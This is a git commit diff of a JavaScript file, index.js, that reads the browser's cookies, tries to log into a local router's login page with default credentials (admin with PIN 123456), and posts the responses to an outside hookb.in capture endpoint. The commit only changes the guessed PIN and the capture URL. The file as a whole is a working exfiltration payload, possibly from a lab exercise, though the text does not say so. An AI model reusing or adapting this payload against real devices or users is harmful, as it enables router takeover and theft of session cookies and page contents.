ef95996275878f0371ccd14cb8c84f9792c31067
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-07 17:25:51 -0800

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@
 let cook = document.cookie;
 
 let http = new XMLHttpRequest();
-let url = cook + '&username=' + 'admin' + '&pin=' + 'password' + '&notRobot=on';
+let url = cook + '&username=' + 'admin' + '&pin=' + '123456' + '&notRobot=on';
 http.open('POST', 'http://router.local/login.php', true);
 //'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
 //http://router.local/view.php
@@ -14,7 +14,7 @@ http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 
 http.onload = function () {
     let xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://hookb.in/b90qZd1nMehKGq00yEYm', true);
+    xhr.open('POST', 'https://hookb.in/E7Gm032dJKtVjY6692Mx', true);
     xhr.setRequestHeader('Content-type', 'application/json');
     xhr.send(JSON.stringify(http.responseURL));
 };
@@ -31,7 +31,7 @@ http.onreadystatechange = function () {
             req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             req.onload = function () {
                 let r = new XMLHttpRequest();
-                r.open('POST', 'https://hookb.in/b90qZd1nMehKGq00yEYm', true);
+                r.open('POST', 'https://hookb.in/E7Gm032dJKtVjY6692Mx', true);
                 r.setRequestHeader('Content-type', 'application/json');
                 r.send(JSON.stringify(req.responseText));
             };
